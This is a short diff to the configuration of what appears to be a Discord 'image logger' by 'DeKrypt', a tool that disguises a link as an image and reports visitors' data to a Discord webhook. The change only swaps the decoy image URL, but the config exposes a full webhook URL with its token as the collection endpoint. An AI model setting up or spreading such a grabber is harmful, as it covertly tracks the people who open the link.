@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discordapp.com/api/webhooks/1460742252182765742/EUGlJGyeX3Fsv3aPtzbmjysKM4MKUbIuMjWshRBc3rIjTegu_-OjgSg2UYzlM1-SjZow",
-    "image": "https://jhonporkimages.vercel.app/api/image", # You can also have a custom image by using a URL argument
+    "image": "https://i.scdn.co/image/ab67616d00001e02d03abb70558ec7898c69b57b", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
